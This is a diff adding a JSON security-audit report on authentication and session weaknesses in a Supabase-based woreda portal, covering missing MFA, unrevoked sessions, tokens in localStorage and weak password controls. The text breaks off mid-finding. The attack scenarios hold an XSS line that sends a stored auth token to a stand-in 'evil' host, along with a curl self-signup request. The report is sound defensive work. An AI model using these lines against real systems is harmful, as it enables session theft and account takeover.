@@ -1,0 +1,887 @@
+{
+  "agent": "audit-auth-session",
+  "findings": [
+    {
+      "status": "Open",
+      "id": "WP-AUTH-001",
+      "title": "No multi-factor authentication for any role, including platform-wide super_admin and tenant_admin",
+      "severity": "High",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (7.4)",
+      "confidence": "Confirmed",
+      "category": "AuthN",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "C-05",
+          "D-03",
+          "E-03"
+        ],
+        "owasp_top10": [
+          "A07:2021"
+        ],
+        "owasp_api": [
+          "API2:2023"
+        ],
+        "asvs": [
+          "V4.3.1",
+          "V2.2.1"
+        ],
+        "iso27001": [
+          "A.8.5",
+          "A.8.2"
+        ],
+        "nist_csf": [
+          "PR.AA-03"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "src/routes/login.tsx",
+          "line": 96,
+          "snippet": "const { data, error } = await supabase.auth.signInWithPassword({ email: values.email, password: values.password });"
+        },
+        {
+          "path": "src/routes/login.tsx",
+          "line": 144,
+          "snippet": "if (appUser.role === \"super_admin\") { navigate({ to: \"/admin/dashboard\" }); }"
+        },
+        {
+          "path": "docs/audit/2026-09-24/raw/auth-session-evidence.txt",
+          "line": 0,
+          "snippet": "## MFA / AAL usage (expect empty) -> (no matches) for auth.mfa|getAuthenticatorAssuranceLevel|aal2 across src/ and supabase/"
+        },
+        {
+          "path": "src/components/ui/input-otp.tsx",
+          "line": 1,
+          "snippet": "shadcn OTP input primitive exists but is imported by no route or component"
+        }
+      ],
+      "description": "Sign-in is a single password factor for every role. No code path enrols a factor (supabase.auth.mfa.enroll/challenge/verify), reads the assurance level (getAuthenticatorAssuranceLevel), or requires aal2 in any RLS policy or RPC. A super_admin (console_role_id NULL = unrestricted) reads every tenant's resident PII, including decrypted national-ID views, and provisions tenants and admins; a tenant_admin controls a whole woreda. Even if TOTP were switched on in the Supabase dashboard, nothing in the app or the database would require it, so it would be optional per user.",
+      "attack_scenario": "A phished, reused or guessed password of a super_admin (credential stuffing against /auth/v1/token is rate-limited only per IP, see WP-AUTH-005) is sufficient to open /admin with platform-wide read of all woredas and the ability to invite new super admins.",
+      "impact": "Full cross-tenant confidentiality/integrity compromise from one stolen password; no second barrier for the most privileged accounts.",
+      "recommendation": "Enable TOTP (and optionally WebAuthn) in Supabase Auth. Add an MFA enrolment + challenge step after signInWithPassword for super_admin and tenant_admin (mandatory) and optionally for finance/civil roles. Enforce server-side: add `(auth.jwt()->>'aal') = 'aal2'` to is_super_admin()/is_tenant_admin() (or a RESTRICTIVE policy on sensitive tables) and check aal in privileged Edge Functions, so a password-only session cannot use privileged paths even if the UI step is skipped.",
+      "secure_fix_example": "-- migration (new, additive)\nCREATE OR REPLACE FUNCTION public.is_super_admin() RETURNS boolean LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$\n  SELECT EXISTS (SELECT 1 FROM app_user WHERE user_id = auth.uid() AND role = 'super_admin' AND status = 'active')\n     AND coalesce(auth.jwt()->>'aal','aal1') = 'aal2';\n$$;\n// client after password sign-in\nconst { data: aal } = await supabase.auth.mfa.getAuthenticatorAssuranceLevel();\nif (aal.nextLevel === 'aal2' && aal.currentLevel !== 'aal2') navigate({ to: '/mfa' });",
+      "effort": "M"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-002",
+      "title": "Suspending or deactivating a staff account does not revoke its Supabase sessions; the woreda portal has no status gate",
+      "severity": "High",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N (7.1)",
+      "confidence": "Confirmed",
+      "category": "AuthN",
+      "module": "Settings",
+      "refs": {
+        "insa": [
+          "C-05",
+          "D-03"
+        ],
+        "owasp_top10": [
+          "A07:2021",
+          "A01:2021"
+        ],
+        "owasp_api": [
+          "API2:2023"
+        ],
+        "asvs": [
+          "V3.3.1",
+          "V3.3.4"
+        ],
+        "iso27001": [
+          "A.5.18",
+          "A.8.5"
+        ],
+        "nist_csf": [
+          "PR.AA-05"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "src/components/settings/UsersRolesTab.tsx",
+          "line": 257,
+          "snippet": ".update({ status: \"suspended\" })  -- only the app_user row changes; no Edge Function call, no auth.admin.signOut / ban"
+        },
+        {
+          "path": "src/components/admin/PlatformUsersTab.tsx",
+          "line": 828,
+          "snippet": ".update({ status: nextStatus })"
+        },
+        {
+          "path": "src/routes/admin.tsx",
+          "line": 24,
+          "snippet": "// A suspended/inactive super_admin keeps a live session (suspension\n  // doesn't revoke the JWT)"
+        },
+        {
+          "path": "src/routes/woreda.tsx",
+          "line": 21,
+          "snippet": "if (!role) return <Navigate to=\"/login\" />;\n  if (role === \"super_admin\") return <Navigate to=\"/admin/dashboard\" />;  -- no status !== 'active' check (admin.tsx:31 has one)"
+        },
+        {
+          "path": "src/hooks/useAuthBootstrap.ts",
+          "line": 130,
+          "snippet": "if (event === \"SIGNED_IN\" || event === \"TOKEN_REFRESHED\" || event === \"USER_UPDATED\") { ... fetchAuthState(...) }  -- refreshes status but nothing acts on it"
+        },
+        {
+          "path": "docs/audit/2026-09-24/raw/auth-session-evidence.txt",
+          "line": 0,
+          "snippet": "## Session revocation on suspension -> (no matches) for admin.signOut|ban_duration|deleteUser|auth.sessions|auth.refresh_tokens"
+        }
+      ],
+      "description": "Suspension is implemented purely as an app_user.status UPDATE from the browser. GoTrue is never told: the user's refresh token stays valid, autoRefreshToken keeps minting fresh access tokens indefinitely (absent a dashboard time-box, see WP-AUTH-004), and the session survives until the user signs out. login.tsx only blocks non-active users at the moment of a new password sign-in, and admin.tsx gates on status, but woreda.tsx (the tenant portal layout) does not. Combined with WP-DB-001 (get_user_woreda_id() ignores status, so a suspended user keeps SELECT on 43 tables and RW/D on 9 storage buckets) a suspended clerk who is already signed in keeps reading residents, civil events and payments, and keeps writing to storage.",
+      "attack_scenario": "A registry clerk is suspended for misconduct while signed in at their desk (or on a second machine). They keep the tab open (or re-open it later: the refresh token in localStorage still works) and continue exporting resident data through list pages that have no PermissionGate; RLS still resolves their woreda.",
+      "impact": "Access revocation is not effective for already-issued sessions; insider-threat containment fails; INSA session-termination expectations not met.",
+      "recommendation": "Route suspension/deactivation through a service-role Edge Function that (1) updates app_user.status, (2) calls auth.admin.signOut for the user's sessions (or sets ban_duration via auth.admin.updateUserById(id, { ban_duration: '876000h' }) so refresh is refused), and (3) writes the audit row server-side. Clear ban on reactivation. Add the same status !== 'active' redirect to woreda.tsx that admin.tsx already has. Fix WP-DB-001 so the database also stops honouring the old JWT.",
+      "secure_fix_example": "// supabase/functions/set-user-status/index.ts (sketch)\nawait admin.from('app_user').update({ status }).eq('user_id', target).select('user_id').maybeSingle();\nif (status !== 'active') await admin.auth.admin.updateUserById(target, { ban_duration: '876000h' });\nelse await admin.auth.admin.updateUserById(target, { ban_duration: 'none' });\n// src/routes/woreda.tsx\nif (status !== 'active') return <Navigate to=\"/login\" />;",
+      "effort": "M"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-003",
+      "title": "Access and refresh tokens persisted in localStorage (INSA C-04 gap not declared; compensating controls incomplete)",
+      "severity": "Medium",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N (6.8)",
+      "confidence": "Confirmed",
+      "category": "AuthN",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "C-04",
+          "D-03"
+        ],
+        "owasp_top10": [
+          "A07:2021",
+          "A05:2021"
+        ],
+        "owasp_api": [
+          "API2:2023"
+        ],
+        "asvs": [
+          "V3.2.3",
+          "V3.4.2",
+          "V14.4.3"
+        ],
+        "iso27001": [
+          "A.8.5"
+        ],
+        "nist_csf": [
+          "PR.AA-05",
+          "PR.DS-02"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "src/integrations/supabase/client.ts",
+          "line": 24,
+          "snippet": "storage: typeof window !== \"undefined\" ? localStorage : undefined,\n      persistSession: true,\n      autoRefreshToken: true,"
+        },
+        {
+          "path": "src/lib/security-headers.ts",
+          "line": 52,
+          "snippet": "\"script-src 'self' 'unsafe-inline'\","
+        },
+        {
+          "path": "src/lib/security-headers.ts",
+          "line": 56,
+          "snippet": "`connect-src 'self' ${supabase} ${supabase.replace(\"https://\", \"wss://\")}`,"
+        },
+        {
+          "path": "docs/security-functionality.md",
+          "line": 65,
+          "snippet": "- **Transport**: bearer JWT via the `Authorization` header, not a cookie. ... `auth.storage: localStorage`"
+        }
+      ],
+      "description": "The supabase-js session object (access token + long-lived refresh token) is stored under the default sb-<ref>-auth-token key in window.localStorage. INSA C-04 expects session tokens in Secure; HttpOnly; SameSite cookies. localStorage is readable by any script executing in the origin, so any XSS yields a persistent session (the refresh token), not just a short-lived one. docs/security-functionality.md describes the storage choice only to justify CSRF being N/A; it never declares the C-04 deviation or its compensating controls. Present compensating controls: CSP connect-src restricted to self + the Supabase project (limits fetch/XHR exfiltration), object-src 'none', form-action 'self', frame-ancestors 'self'. Weaknesses: script-src 'unsafe-inline' (inline-script injection executes), four HTML sinks exist (rich-text-editor innerHTML, LetterTemplatesTab and service print dangerouslySetInnerHTML, chart.tsx) whose sanitisation is appsec's verdict, navigation-based exfiltration (location=) is not blocked by CSP, and JWT lifetime / refresh-token reuse detection are unverified (WP-AUTH-009). No auth cookie is set anywhere; the only document.cookie write is the sidebar_state UI preference (src/components/ui/sidebar.tsx:86).",
+      "attack_scenario": "Stored XSS in operator-authored letter-template HTML (or any future sink) runs `fetch` blocked by connect-src but `location='https://evil/?t='+localStorage['sb-…-auth-token']` is not; the attacker replays the refresh token from their own machine and holds the victim's session until it is revoked.",
+      "impact": "Any XSS becomes durable account takeover; token theft is invisible to the victim.",
+      "recommendation": "Either (a) move to cookie-based sessions: @supabase/ssr createBrowserClient/createServerClient with a server-set HttpOnly; Secure; SameSite=Lax cookie (requires server routes in TanStack Start, which the app currently avoids), or (b) formally declare C-04 as PARTIAL in the SFD with the compensating-control set and harden it: nonce-based CSP without 'unsafe-inline', DOMPurify on every HTML sink, short access-token expiry (<=15 min), refresh-token reuse detection on, server-side inactivity/time-box (WP-AUTH-004), and MFA (WP-AUTH-001). Option (b) is the realistic near-term path.",
+      "secure_fix_example": "// docs/security-functionality.md (declaration)\n// C-04: PARTIAL - tokens in localStorage (supabase-js SPA model). Compensating: CSP nonce-based script-src, connect-src allow-list, DOMPurify on all HTML sinks, JWT exp 900s, refresh reuse detection ON, inactivity timeout 30m, time-box 12h, MFA for admins.",
+      "effort": "M"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-004",
+      "title": "Client idle timeout is reset on every page load and is the only evidenced session timeout; abandoned sessions resume indefinitely",
+      "severity": "Medium",
+      "cvss_v3_1": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (6.1)",
+      "confidence": "Confirmed",
+      "category": "AuthN",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "C-05",
+          "D-03"
+        ],
+        "owasp_top10": [
+          "A07:2021"
+        ],
+        "owasp_api": [
+          "API2:2023"
+        ],
+        "asvs": [
+          "V3.3.2",
+          "V3.3.1"
+        ],
+        "iso27001": [
+          "A.8.5",
+          "A.8.1"
+        ],
+        "nist_csf": [
+          "PR.AA-05"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "src/hooks/useIdleTimeout.ts",
+          "line": 79,
+          "snippet": "let lastActivity = Date.now();"
+        },
+        {
+          "path": "src/hooks/useIdleTimeout.ts",
+          "line": 84,
+          "snippet": "writeStoredActivity(lastActivity);  -- overwrites the shared timestamp on mount without first reading it"
+        },
+        {
+          "path": "src/config/idleTimeout.ts",
+          "line": 8,
+          "snippet": "export const IDLE_LOGOUT_MS = 25 * 60 * 1000;"
+        },
+        {
+          "path": "src/components/layout/AppShell.tsx",
+          "line": 406,
+          "snippet": "useIdleTimeout({ onTimeout: handleSignOut, ... })  -- only mounted inside AppShell (woreda) and AppShell.tsx:566 (admin); /set-password, /login, / are not covered"
+        },
+        {
+          "path": "src/integrations/supabase/client.ts",
+          "line": 25,
+          "snippet": "persistSession: true,\n      autoRefreshToken: true,"
+        }
+      ],
+      "description": "The 20-minute warning / 25-minute sign-out is correctly implemented while the portal is open (absolute timestamp, 15 s poll, cross-tab sharing). But on mount the hook sets lastActivity = now and writes it to localStorage before ever consulting the previously stored value. A user who closes the tab or browser without signing out, and comes back hours or days later, is silently restored by supabase-js from the persisted refresh token and gets a fresh 25-minute window. The timer is also not active on /set-password, where an invite/recovery session can sit indefinitely. No server-side inactivity timeout or session time-box is evidenced in the repository (supabase/config.toml holds only project_id; Supabase's defaults are 'never'), so the effective maximum session lifetime is unbounded. INSA C-05 requires both server-side and client-side controls.",
+      "attack_scenario": "A clerk on a shared office PC closes the browser at lunch without signing out. Anyone opening the portal later on that PC lands in the clerk's authenticated woreda session.",
+      "impact": "Idle timeout is bypassed by the most common real-world pattern (closing the tab); session lifetime is effectively unlimited.",
+      "recommendation": "On mount, read the stored timestamp first and, if (now - stored) >= IDLE_LOGOUT_MS, sign out immediately before rendering the shell; only then write the new timestamp. Mount the hook (or an equivalent guard) on /set-password too. Configure Supabase Auth > Sessions: Inactivity timeout (e.g. 30 min) and Time-box user sessions (e.g. 8-12 h) so the server enforces the limit even if the client code is bypassed; document the values (D-03).",
+      "secure_fix_example": "useEffect(() => {\n  const stored = readStoredActivity();\n  if (stored && Date.now() - stored >= IDLE_LOGOUT_MS) { onTimeoutRef.current(); return; }\n  let lastActivity = Date.now();\n  writeStoredActivity(lastActivity);\n  ...\n}, []);",
+      "effort": "S"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-005",
+      "title": "No CAPTCHA, account lockout or failed-login logging on sign-in; brute-force protection rests on unverified GoTrue per-IP limits, and CAPTCHA cannot be enabled without a code change",
+      "severity": "Medium",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N (6.5)",
+      "confidence": "Confirmed",
+      "category": "AuthN",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "C-05",
+          "D-03"
+        ],
+        "owasp_top10": [
+          "A07:2021"
+        ],
+        "owasp_api": [
+          "API2:2023",
+          "API4:2023"
+        ],
+        "asvs": [
+          "V2.2.1",
+          "V7.2.1"
+        ],
+        "iso27001": [
+          "A.8.5",
+          "A.8.15"
+        ],
+        "nist_csf": [
+          "PR.AA-03",
+          "DE.CM-03"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "src/routes/login.tsx",
+          "line": 96,
+          "snippet": "supabase.auth.signInWithPassword({ email: values.email, password: values.password })  -- no options.captchaToken"
+        },
+        {
+          "path": "supabase/functions/send-password-reset-link/index.ts",
+          "line": 165,
+          "snippet": "await anon.auth.resetPasswordForEmail(targetEmail, { redirectTo: `${SITE_URL}/set-password` })  -- no captchaToken either"
+        },
+        {
+          "path": "docs/testing-scope.md",
+          "line": 52,
+          "snippet": "- [ ] **Supabase → Auth → Rate Limits** — lower sign-in/OTP rate limits ...\n- [ ] **Supabase → Auth → Attack protection** — enable CAPTCHA and leaked password protection."
+        },
+        {
+          "path": "src/routes/login.tsx",
+          "line": 101,
+          "snippet": "setSubmitError(error?.message ?? \"Sign-in failed\");  -- failed attempt is not recorded anywhere app-side"
+        }
+      ],
+      "description": "The browser calls GoTrue's /auth/v1/token directly. The app adds no client throttle, no CAPTCHA token and no per-account lockout (GoTrue itself has none; it only rate-limits per IP). If CAPTCHA protection is turned on in the dashboard, both login.tsx and send-password-reset-link would start failing because neither passes captchaToken, so the recommended control in docs/security-hardening.md:64-67 cannot be enabled as-is. The operator checklist items for rate limits and attack protection are still unchecked. Failed sign-ins are not written to audit_log (only GoTrue's own auth.audit_log_entries, if retained). Login-side enumeration is not an issue: GoTrue returns the same 'Invalid login credentials' for unknown email and wrong password, and the 'not provisioned'/'not active' messages only appear after a correct password.",
+      "attack_scenario": "Distributed password spraying of known staff emails (the login placeholder itself shows the @eharari.gov.et pattern) from many IPs stays under per-IP limits indefinitely; no lockout, CAPTCHA or alert fires.",
+      "impact": "Online guessing/credential stuffing against a single-factor login (see WP-AUTH-001) is limited only by per-IP rate limits of unknown value.",
+      "recommendation": "Add Turnstile/hCaptcha to login.tsx and pass options.captchaToken; for send-password-reset-link, either call /recover with a server-side captcha bypass strategy or use admin.generateLink + own mail. Then enable CAPTCHA in Auth > Attack Protection. Lower Auth rate limits (sign-in/sign-up per IP, token refresh, email sends). Add an app-level failed-attempt counter or a GoTrue auth hook / log drain alert on repeated 'invalid_credentials' per email; consider progressive delay per account.",
+      "secure_fix_example": "const { data, error } = await supabase.auth.signInWithPassword({\n  email: values.email, password: values.password,\n  options: { captchaToken },\n});",
+      "effort": "M"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-006",
+      "title": "Password change requires neither the current password nor re-authentication, and does not explicitly revoke other sessions",
+      "severity": "Medium",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N (6.4)",
+      "confidence": "Confirmed",
+      "category": "AuthN",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "D-03"
+        ],
+        "owasp_top10": [
+          "A07:2021"
+        ],
+        "owasp_api": [
+          "API2:2023"
+        ],
+        "asvs": [
+          "V2.1.6",
+          "V3.3.3",
+          "V3.7.1"
+        ],
+        "iso27001": [
+          "A.5.17",
+          "A.8.5"
+        ],
+        "nist_csf": [
+          "PR.AA-03"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "src/components/common/ChangePasswordDialog.tsx",
+          "line": 56,
+          "snippet": "const { error: updateErr } = await supabase.auth.updateUser({ password });  -- no current-password field, no nonce"
+        },
+        {
+          "path": "src/routes/set-password.tsx",
+          "line": 119,
+          "snippet": "const { error } = await supabase.auth.updateUser({ password: values.password });  -- reachable by any signed-in user, not only invite/recovery sessions"
+        },
+        {
+          "path": "docs/audit/2026-09-24/raw/auth-session-evidence.txt",
+          "line": 0,
+          "snippet": "no call to supabase.auth.reauthenticate() or signOut({ scope: 'others' }) anywhere in src/"
+        }
+      ],
+      "description": "Anyone holding a live session (unattended PC, stolen localStorage token per WP-AUTH-003) can set a new password without knowing the old one, turning a temporary session compromise into permanent account takeover that survives token revocation. The code has no support for Supabase's 'Secure password change' (reauthenticate() + nonce), so that dashboard setting is either off or would break password change for sessions older than 24 h. After a change, the app does not call signOut({ scope: 'others' }); whether GoTrue revokes other sessions on password update is platform behaviour that must be verified live.",
+      "attack_scenario": "Attacker with a stolen refresh token opens /set-password (or the avatar menu), sets a new password, and now owns the account even after the victim's sessions are revoked.",
+      "impact": "Session compromise escalates to persistent credential compromise; legitimate user is locked out.",
+      "recommendation": "Require the current password in ChangePasswordDialog (verify by signInWithPassword against the same email, or enable Secure password change and implement reauthenticate() + nonce). Restrict /set-password to sessions that arrived via invite/recovery (e.g. check amr contains 'otp'/'recovery' or appUser.status === 'pending'). After a successful change call supabase.auth.signOut({ scope: 'others' }) and write an audit_log entry.",
+      "secure_fix_example": "const { error: reauthErr } = await supabase.auth.signInWithPassword({ email: user.email!, password: currentPassword });\nif (reauthErr) return setError('Current password is incorrect');\nawait supabase.auth.updateUser({ password });\nawait supabase.auth.signOut({ scope: 'others' });",
+      "effort": "S"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-007",
+      "title": "Password policy (8-char minimum) is enforced only in the browser; server-side minimum and breached-password screening are unverified",
+      "severity": "Medium",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N (4.8)",
+      "confidence": "Needs-live-verification",
+      "category": "AuthN",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "D-03"
+        ],
+        "owasp_top10": [
+          "A07:2021"
+        ],
+        "owasp_api": [
+          "API2:2023"
+        ],
+        "asvs": [
+          "V2.1.1",
+          "V2.1.7",
+          "V2.1.9"
+        ],
+        "iso27001": [
+          "A.5.17"
+        ],
+        "nist_csf": [
+          "PR.AA-01"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "src/routes/set-password.tsx",
+          "line": 24,
+          "snippet": "password: z.string().min(8, \"Password must be at least 8 characters\"),"
+        },
+        {
+          "path": "src/components/common/ChangePasswordDialog.tsx",
+          "line": 47,
+          "snippet": "if (password.length < 8) {"
+        },
+        {
+          "path": "src/routes/login.tsx",
+          "line": 35,
+          "snippet": "password: z.string().min(6, \"Password must be at least 6 characters\"),  -- login-side only; implies accounts with 6-7 char passwords are expected to exist"
+        },
+        {
+          "path": "docs/testing-scope.md",
+          "line": 54,
+          "snippet": "- [ ] **Supabase → Auth → Attack protection** — enable CAPTCHA and leaked\n      password protection."
+        }
+      ],
+      "description": "The 8-character minimum lives in zod/JS only. GoTrue's own minimum (Auth > Providers > Email > Minimum password length) defaults to 6 and is not in the repo; a direct PUT /auth/v1/user with a 6-character password succeeds unless it was raised. Leaked-password (HaveIBeenPwned) protection is listed as an open operator action. No forced composition rules exist (good, per NIST 800-63B). No maximum is enforced client-side (GoTrue rejects >72 bytes).",
+      "attack_scenario": "A user bypasses the dialog (browser console) and sets a 6-character or known-breached password, which is then guessable under WP-AUTH-005.",
+      "impact": "Weak or breached passwords possible on single-factor accounts.",
+      "recommendation": "Set Minimum password length >= 12 (ASVS L2) or at least 8 in the dashboard, enable Leaked password protection, keep composition rules off; mirror the same value in a shared client constant; align login.tsx min to not leak policy (or drop the min there). Record the values in the SFD.",
+      "secure_fix_example": "Supabase Dashboard > Authentication > Providers > Email: Minimum password length = 12; Password requirements = none; Authentication > Attack Protection: Prevent use of leaked passwords = ON.",
+      "effort": "S"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-008",
+      "title": "GoTrue public endpoints the UI does not expose (sign-up, anonymous sign-in, self-service /recover) are not evidenced as disabled; self-registered users would gain the authenticated role",
+      "severity": "Medium",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (5.3)",
+      "confidence": "Needs-live-verification",
+      "category": "Config",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "D-03",
+          "D-01"
+        ],
+        "owasp_top10": [
+          "A05:2021",
+          "A01:2021"
+        ],
+        "owasp_api": [
+          "API2:2023",
+          "API8:2023"
+        ],
+        "asvs": [
+          "V2.5.1",
+          "V4.1.3"
+        ],
+        "iso27001": [
+          "A.8.9",
+          "A.5.15"
+        ],
+        "nist_csf": [
+          "PR.PS-01"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "supabase/config.toml",
+          "line": 1,
+          "snippet": "project_id = \"woredas-portal\"  -- no [auth] enable_signup / enable_anonymous_sign_ins"
+        },
+        {
+          "path": "supabase/migrations/00000000000000_baseline.sql",
+          "line": 1661,
+          "snippet": "CREATE POLICY woreda_read_all_authenticated ON public.woreda AS PERMISSIVE FOR SELECT TO authenticated USING (true);"
+        },
+        {
+          "path": "supabase/migrations/00000000000000_baseline.sql",
+          "line": 1590,
+          "snippet": "CREATE POLICY id_card_template_read_all ON public.id_card_template AS PERMISSIVE FOR SELECT TO authenticated USING (true);"
+        },
+        {
+          "path": "supabase/migrations/00000000000001_storage.sql",
+          "line": 67,
+          "snippet": "CREATE POLICY credential_templates_read_all ON storage.objects AS PERMISSIVE FOR SELECT TO authenticated USING ((bucket_id = 'credential-templates'::text));"
+        },
+        {
+          "path": "supabase/migrations/00000000000025_workflow_engine.sql",
+          "line": 103,
+          "snippet": "AS PERMISSIVE FOR SELECT TO authenticated USING (true);  -- workflow_transition"
+        }
+      ],
+      "description": "The application is invite-only by design, but that is a UI property. With only the public anon/publishable key, anyone can call /auth/v1/signup (and /auth/v1/signup with anonymous sign-in, if enabled) to obtain a JWT with role=authenticated and no app_user row. Five policies grant SELECT to every authenticated caller unconditionally (woreda, id_card_template, id_card_template_field, id_card_template_field_draft, workflow_transition) plus the credential-templates storage bucket; database findings WP-DB-009/010 describe RPCs that also only need an authenticated caller. Separately, /auth/v1/recover is callable by anyone for any staff email, so an unauthenticated self-service reset path exists at the API layer regardless of the UI's 'contact your administrator' stance (the email still goes only to the account's mailbox). Whether 'Allow new users to sign up' and 'Anonymous sign-ins' are OFF cannot be determined from the repo.",
+      "attack_scenario": "curl -X POST https://<ref>.supabase.co/auth/v1/signup -H 'apikey: <publishable>' -d '{\"email\":\"x@evil\",\"password\":\"...\"}' returns a session (if confirmations are off) whose token reads the platform's tenant list and ID-card template artwork/layout and calls authenticated-only RPCs.",
+      "impact": "If sign-up/anonymous sign-in is enabled: unauthenticated Internet users obtain an authenticated foothold; low-sensitivity data exposure today, but any future 'TO authenticated USING (true)' policy becomes public.",
+      "recommendation": "Confirm and document: Auth > Providers > Email 'Allow new users to sign up' = OFF, 'Anonymous sign-ins' = OFF, 'Confirm email' = ON. Defence in depth: replace USING (true) with USING (public.is_active_app_user()) on the five tables and the credential-templates bucket policy so a bare authenticated JWT without an active app_user row reads nothing. Declare the GoTrue /recover path in the SFD (or restrict via email rate limits / CAPTCHA).",
+      "secure_fix_example": "DROP POLICY IF EXISTS woreda_read_all_authenticated ON public.woreda;\nCREATE POLICY woreda_read_all_active ON public.woreda FOR SELECT TO authenticated USING (public.is_active_app_user());",
+      "effort": "S"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-009",
+      "title": "Platform JWT signing algorithm, access-token lifetime and refresh-token rotation/reuse detection are neither documented nor evidenced (INSA E-03 declaration missing)",
+      "severity": "Low",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N (3.7)",
+      "confidence": "Needs-live-verification",
+      "category": "Crypto",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "E-03",
+          "C-05",
+          "D-03"
+        ],
+        "owasp_top10": [
+          "A02:2021",
+          "A07:2021"
+        ],
+        "owasp_api": [
+          "API2:2023"
+        ],
+        "asvs": [
+          "V3.5.3",
+          "V3.3.1"
+        ],
+        "iso27001": [
+          "A.8.24",
+          "A.8.5"
+        ],
+        "nist_csf": [
+          "PR.DS-02",
+          "PR.AA-05"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "supabase/config.toml",
+          "line": 1,
+          "snippet": "project_id = \"woredas-portal\"  -- no [auth] jwt_expiry, enable_refresh_token_rotation, refresh_token_reuse_interval"
+        },
+        {
+          "path": "supabase/functions/sign-credential/index.ts",
+          "line": 89,
+          "snippet": "const { data: userData, error: userErr } = await admin.auth.getUser(jwt);"
+        },
+        {
+          "path": "src/integrations/supabase/auth-middleware.ts",
+          "line": 56,
+          "snippet": "const { data, error } = await supabase.auth.getClaims(token);  -- dormant (requireSupabaseAuth imported nowhere)"
+        },
+        {
+          "path": "docs/security-functionality.md",
+          "line": 78,
+          "snippet": "- **Session regeneration**: handled entirely by Supabase Auth's own refresh-token rotation (`autoRefreshToken`) ..."
+        }
+      ],
+      "description": "Code-side JWT handling is sound: all 8 Edge Functions validate the caller by calling GoTrue (auth.getUser), which checks signature, exp and that the session still exists; no custom claims are trusted (no access-token hook, no auth.jwt() authorisation - roles are re-read from app_user per query, so privilege changes apply immediately). But the platform parameters INSA E-03 asks for are all dashboard-only and undocumented: whether the project still signs user JWTs with the legacy shared HS256 secret or has migrated to asymmetric JWT signing keys (ES256/RS256), the access-token lifetime (default 3600 s), and whether refresh-token reuse detection is on. After signOut, an already-issued access token remains usable against PostgREST/Storage until exp (stateless), so the lifetime directly bounds the post-logout replay window.",
+      "attack_scenario": "If the legacy HS256 JWT secret leaks (it is shared with every service that verifies tokens), arbitrary tokens for any user can be forged; with a 1 h expiry a stolen access token outlives logout by up to an hour.",
+      "impact": "Unknown compliance status for E-03; potential forgery blast radius under HS256; post-logout replay window.",
+      "recommendation": "Provide the dashboard values (see UNVERIFIED list). Migrate to asymmetric JWT signing keys (Settings > JWT Keys) and revoke the legacy secret once clients are rotated to publishable/secret API keys; note that Edge Functions deployed with gateway verify_jwt=true must then switch to in-function verification (they already call getUser). Set access-token expiry to 600-900 s; keep refresh rotation with reuse detection ON (reuse interval <= 10 s). Record all values in the SFD.",
+      "secure_fix_example": "Dashboard: Settings > JWT Keys > 'Migrate JWT secret' -> rotate to ES256 standby key -> revoke legacy secret. Auth > Sessions/JWT expiry: 900. Detect and revoke potentially compromised refresh tokens: ON.",
+      "effort": "S"
+    },
+    {
+      "status": "Open",
+      "id": "WP-AUTH-010",
+      "title": "Implicit OAuth flow: invite/recovery sessions (including the refresh token) are delivered in the URL fragment",
+      "severity": "Low",
+      "cvss_v3_1": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N (3.1)",
+      "confidence": "Likely",
+      "category": "AuthN",
+      "module": "Platform",
+      "refs": {
+        "insa": [
+          "C-04",
+          "E-03"
+        ],
+        "owasp_top10": [
+          "A07:2021"
+        ],
+        "owasp_api": [
+          "API2:2023"
+        ],
+        "asvs": [
+          "V3.1.1"
+        ],
+        "iso27001": [
+          "A.8.5"
+        ],
+        "nist_csf": [
+          "PR.AA-05"
+        ]
+      },
+      "evidence": [
+        {
+          "path": "src/integrations/supabase/client.ts",
+          "line": 23,
+          "snippet": "auth: { storage: ..., persistSession: true, autoRefreshToken: true }  -- no flowType, so the default applies"
+        },
+        {
+          "path": "node_modules/@supabase/auth-js/dist/module/GoTrueClient.js",
+          "line": 21,
+          "snippet": "flowType: 'implicit',  (auth-js 2.112.3 DEFAULT_OPTIONS)"
+        },
+        {
+          "path": "supabase/functions/invite-tenant-user/index.ts",
+          "line": 114,
+          "snippet": "redirectTo: `${SITE_URL}/set-password`,"
+        },
+        {
+          "path": "src/lib/authRedirect.ts",
